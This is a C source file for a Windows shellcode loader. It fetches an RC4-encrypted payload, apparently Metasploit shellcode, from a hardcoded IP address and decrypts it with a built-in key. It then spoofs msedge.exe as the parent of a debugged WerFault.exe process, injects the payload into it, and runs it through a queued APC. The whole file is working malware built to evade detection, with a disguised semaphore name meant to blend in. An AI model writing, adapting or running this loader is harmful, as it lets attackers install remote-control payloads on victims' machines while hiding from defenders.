#include <windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <Tlhelp32.h>
#include "Struct.h"

#pragma warning (disable:4996)
#pragma comment (lib, "Wininet.lib")

#define TARGET_PROCESS "WerFault.exe"
#define TARGET_PARENT L"msedge.exe"
#define PAYLOAD L"http://192.168.0.122/encoded_msf.bin"

//hardcoded key to decipher Rc4 payload
unsigned char Rc4Key[] = { 0x10, 0x27, 0x3B, 0x62, 0x79, 0x82, 0xAA, 0xDA, 0x02, 0x4F, 0x50, 0x05, 0x6A, 0x9C, 0x0F, 0x0F };

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;
    HINTERNET	hInternet = NULL,
                hInternetFile = NULL;
    DWORD		dwBytesRead = NULL;
    SIZE_T		sSize = NULL; 	 			        
    PBYTE		pBytes = NULL,					    
                pTmpBytes = NULL;					

    hInternet = InternetOpenW(L"msfrulz", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    while (TRUE) {

        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        if (pBytes == NULL) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											// Closing handle 
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    if (pTmpBytes)
        LocalFree(pTmpBytes);													// Freeing the temp buffer
    return bSTATE;
}

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
    NTSTATUS    STATUS = NULL;
    USTRING Key = { .Buffer = pRc4Key, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },
            Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };

    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        return FALSE;
    }
    return TRUE;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        return FALSE;
    }

    return TRUE;
}

BOOL CreateSuspendedSpoofedProcess2(HANDLE hParentProcess, LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];
    CHAR CurrentDir[MAX_PATH];

    SIZE_T sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    STARTUPINFOEXA SiEx = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    //Clean the structs
    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    //set the size of structure
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    //get the %windir& env var path 
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        return FALSE;
    }

    //create the target process path for CreateProcessA
    //example: if windir is C:\Windows, it will look for TARGET_PROCESS in C:\Windows\system32
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

    // making the `lpCurrentDirectory` parameter in CreateProcessA
    sprintf(CurrentDir, "%s\\System32\\", WnDr);

    //fail with ERROR_INSUFFICIENT_BUFFER / 122
    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL) {
        return FALSE;
    }

    // calling InitializeProcThreadAttributeList again passing the right parameters
    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        return FALSE;
    }

    SiEx.lpAttributeList = pThreadAttList;

    //create the process
    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS | EXTENDED_STARTUPINFO_PRESENT, NULL, CurrentDir, &SiEx.StartupInfo, &Pi)) {
        return FALSE;
    }

    //fill up the OUTPUT params with CreateProcessA outpuit
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    DeleteProcThreadAttributeList(pThreadAttList);
    CloseHandle(hParentProcess);

    //checks
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

//source: https://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html
int findMyProc(const char* procname) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);

    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        if (strcmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(hSnapshot);
    return pid;
}

int main()
{
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;

    HANDLE hParent = NULL;
    DWORD dwPPid = findMyProc(TARGET_PARENT);

    PBYTE Rc4CipherText = NULL;
    SIZE_T sRc4CipherText = NULL;

    //Checking if payload is already running using Semaphore
    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "wuauctl");
    if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
        return -1;
    }

    //download the shellcode
    if (!GetPayloadFromUrl(PAYLOAD, &Rc4CipherText, &sRc4CipherText)) {
        return -2;
    }

    //decipher the payload
    if (!Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sRc4CipherText)) {
        return -3;
    }

    //Open process to parent
    if ((hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPPid)) == NULL) {
        return -5;
    }

    //create target remote process in debugged state
    if (!CreateSuspendedSpoofedProcess2(hParent, TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
        return -6;
    }

    //inject payload and get the base address
    if (!InjectShellcodeToRemoteProcess(hProcess, Rc4CipherText, sRc4CipherText, &pAddress)) {
        return -7;
    }
    //queue the APC
    QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

    //run payload
    DebugActiveProcessStop(dwProcessId);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}

